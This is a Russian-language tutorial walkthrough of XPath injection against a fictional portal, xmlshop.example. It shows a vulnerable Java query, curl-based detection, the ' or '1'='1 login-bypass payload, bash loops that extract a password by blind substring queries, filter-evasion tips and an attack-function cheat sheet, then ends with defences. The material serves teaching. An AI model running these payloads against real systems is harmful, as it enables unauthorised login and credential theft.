## Задача

Есть внутренний портал `xmlshop.example` — учётки сотрудников хранятся не в базе данных, а в **XML-файле** (обычный текстовый формат с тегами). Проверка логина делает **XPath-запрос** — это язык поиска по XML, родственный SQL, но для тегов. Если ввод склеивают с запросом, мы можем подменить его логику и войти без пароля.

Цель: войти под `admin` и вытащить пароль из XML, даже если приложение ничего не показывает.

## Данные, с которыми работаем

В исходниках видно, как строится запрос:

```java
String q = "//users/user[username/text()='" + user + "' and password/text()='" + pass + "']";
```

Разберём. `//users/user` — найти все узлы `user`. В квадратных скобках — условие-предикат: `username/text()='...'` значит «текст внутри тега `username` равен введённому». `and` — логическое И. Значит, приложение ищет запись, где логин **и** пароль совпали.

Опасность: ввод `user` **склеен** с выражением. Мы можем закрыть кавычку и дописать своё условие. Это **XPath-инъекция**.

Сначала посмотрим нормальное поведение:

```bash
$ curl -s -X POST https://xmlshop.example/login \
    --data-urlencode 'username=alice' --data-urlencode 'password=wrong'
{"error":"login failed"}
```

## Пробуем в лоб

Первый тест — одна **одиночная кавычка**. В XPath она открывает/закрывает строку. Если ввод не экранируется, кавычка нарушит баланс и парсер вернёт ошибку синтаксиса.

```bash
$ curl -s -o /dev/null -w '%{http_code}\n' -X POST https://xmlshop.example/login \
    --data-urlencode "username=admin'" --data-urlencode 'password=x'
500
```

Обычный ввод давал 200, а с кавычкой — **500** (внутренняя ошибка сервера). Это признак того, что наше выражение дошло до XPath-парсера и сломало его. Инъекция есть.

## Приём: делаем условие всегда истинным

В SQL ты привык к `' OR 1=1--`. В XPath **комментариев нет** — хвост не закомментировать, поэтому нужно сбалансировать кавычки самому. Классический payload:

```text
admin' or '1'='1
```

Посмотрим, во что превратится запрос:

```xpath
//users/user[username/text()='admin' or '1'='1' and password/text()='x']
```

Часть `'1'='1'` — всегда истина, поэтому условие по логину выполняется для первой записи, а пароль больше ни на что не влияет. Пробуем:

```bash
$ curl -s -X POST https://xmlshop.example/login \
    --data-urlencode "username=admin' or '1'='1" --data-urlencode 'password=x' -c cookies.txt
{"ok":true,"user":"admin","role":"administrator"}
```

Вошли. Кука в `cookies.txt` — наша сессия. Это обход аутентификации.

## Слепое извлечение: читаем пароль по символу

Портал отвечает `ok`/`error` — то есть даёт булев сигнал. Этого хватает, чтобы вытянуть любой узел XML, даже не видя его. Приём — **boolean-blind** через функции `substring` (взять подстроку) и `string-length` (длина строки).

Сначала узнаем длину пароля admin. Для каждого `N` спрашиваем: «длина пароля равна N?» — и смотрим, вернулось ли `ok`:

```bash
$ for n in $(seq 1 20); do
>   r=$(curl -s -X POST https://xmlshop.example/login \
>       --data "user=' or string-length(//user[1]/password)=$n and '1'='1&pass=x")
>   echo -n "$r" | grep -q ok && { echo "length=$n"; break; }
> done
length=6
```

Длина 6. Теперь посимвольно: для позиции `i` перебираем буквы и спрашиваем «i-й символ равен `c`?».

```bash
$ for i in $(seq 1 6); do
>   for c in {a..z} {0..9}; do
>     r=$(curl -s -X POST https://xmlshop.example/login \
>         --data "user=' or substring(//user[1]/password,$i,1)='$c' and '1'='1&pass=x")
>     echo -n "$r" | grep -q ok && { echo -n "$c"; break; }
>   done
> done; echo
admin1
```

Пароль `admin1`. Обрати внимание: страница его **нигде не показывала** — мы восстановили значение из одного бита «да/нет». Так же читаются любые узлы: `mail`, `token`, `role`.

## Полный прогон от начала до конца

1. `username=alice` → `{"error":"login failed"}` — базовое поведение.
2. `username=admin'` → HTTP **500** — кавычка сломала XPath, инъекция подтверждена.
3. `username=admin' or '1'='1` → `{"ok":true,"role":"administrator"}` — вход без пароля.
4. `string-length(//user[1]/password)=6` → `ok` — узнали длину.
5. Подбор через `substring(...)='c'` → `admin1` — пароль извлечён.

Один пример провёл нас от пустого логина до секрета внутри XML.

## Если не сработало

- **Вывод вообще не отличается.** Ищи error-based оракул: заставляй парсер падать (`count(//x)=bad`) и по факту ошибки угадывай данные.
- **Фильтруют `'`.** Попробуй двойные кавычки — XPath принимает и `"..."`. Если режут и их, собери строку функцией `concat('a','d','min')`.
- **Фильтруют `or`.** XPath 1.0 регистрозависим, а фильтры часто нет — попробуй `OR`, `Or`.
- **Режут пробелы.** Замени на табы, `%09` или склейку `or(1=1)`.
- **Движок XPath 2.0+** (например, Saxon) умеет `doc()`/`collection()` — это потенциальное чтение внешних файлов, как у XXE. Проверяй, но осторожно.
- **Структуру можно разведать вслепую.** `count(//user)` скажет, сколько записей; `name(//*[1])` — как называются теги. Это помогает строить точный payload, не видя документа.
- **Не забывай про SOAP и SAML.** Там XPath встречается в фильтрах `AttributeQuery` и параметрах поиска — те же приёмы работают и вне обычной формы логина.

## Шпаргалка: функции XPath для инъекции

| Функция | Зачем в атаке |
|---------|---------------|
| `string-length(expr)` | длина строки/значения |
| `substring(expr,pos,len)` | посимвольное извлечение |
| `string-to-codepoints()` | перебор по ASCII-кодам (быстрее букв) |
| `count(//node)` | число узлов — разведка структуры |
| `name(//*[1])` | имя первого узла (как называются теги) |
| `contains(a,b)` / `starts-with(a,b)` | поиск подстроки / проверка префикса |
| `translate(a,b,c)` | обход фильтров регистра |
| `concat('a','b')` | сборка строки, когда кавычки режутся |
| `true()` / `false()` | константы для boolean-оракула |

Этих функций хватает и на разведку структуры, и на слепое чтение. Помни главное отличие от SQL: здесь нет комментариев и stacked-запросов — только чтение.

## На что смотреть дальше

- **Одна кавычка → 500** — самый быстрый тест на XPath-инъекцию.
- **Помни про отсутствие комментариев.** В XPath нельзя «отрезать хвост», поэтому payload балансирует кавычки сам.
- **boolean-blind — твой главный инструмент.** `substring` + `string-length` дают полное чтение.
- **Разведай структуру** через `name(//*[1])` и `count(//user)` — узнаешь имена тегов и число записей.
- **Смотри шире XML.** SOAP-сервисы, SAML и REST-параметры `xpath=`/`filter=` — те же точки.
- **Не ломай прод.** Обход логина и чтение узлов — только чтение; никаких правок XML.

## Приоритет операторов: почему payload вообще работает

XPath вычисляет `and` раньше `or`. Поэтому payload `admin' or '1'='1` вместе с хвостом `and password/text()='x'` разбирается как:

```xpath
username/text()='admin' or ('1'='1' and password/text()='x')
```

Для записи `admin` первая часть истинна → предикат истинен → узел выбран, а пароль ни на что не влияет. Если бы приложение обернуло условия в скобки (`[(username=…) and (password=…)]`), тот же payload дал бы ложь на неверном пароле, и обхода не было бы. Практическое правило: сначала посмотри, **как именно** склеен запрос и в какую точку ты вставляешься, и лишь потом подбирай payload.

## Оракулы: где брать «да/нет»

Boolean-blind не требует, чтобы приложение печатало `ok`/`error`. Годится любой различимый сигнал:

- код ответа (200 против 500);
- длина тела (текст ошибки против успеха);
- наличие/отсутствие конкретной строки в ответе;
- время ответа, если сложное выражение считается заметно дольше.

Сначала зафиксируй «истинный» и «ложный» отклики на заведомо верном и неверном условиях (`'1'='1` против `'1'='2`) и дальше сравнивай с ними. Это делает атаку устойчивой к косметике приложения.

## XPath 2.0/3.0: опаснее, чем кажется

XPath 1.0 умеет только читать дерево документа. Расширенные версии (Saxon, BaseX) добавляют функции `doc()`, `collection()`, `unparsed-text()`, которые **читают внешние файлы и URL**. Если приложение использует такой движок и вставляет ввод в выражение, инъекция превращается в аналог XXE/SSRF: можно попробовать прочитать локальный файл или обратиться к внутреннему сервису.

Проверка: определи движок по тексту сообщений об ошибках, затем пробуй безобидный запрос к своему коллектору. Помни: это уже не «только чтение XML» — это выход за пределы документа, и допустимо лишь в рамках разрешённого теста.

## Защита: что должен сделать разработчик

- **Параметризация.** Использовать компилируемое выражение с переменными (`$user`) и привязкой значений — ввод не попадает в текст запроса.
- **Экранирование.** Если параметризация невозможна, экранировать и `'`, и `"`.
- **Белый список.** Для поиска по XML валидировать ввод регуляркой, отсекая скобки, кавычки и имена функций.
- **Ограничение движка.** XPath 1.0 без `doc()`/`unparsed-text()`, запрет внешних резолверов.
- **Единый ответ.** Одинаковые код и текст на успех и на ошибку логина сужают boolean-канал до нуля.
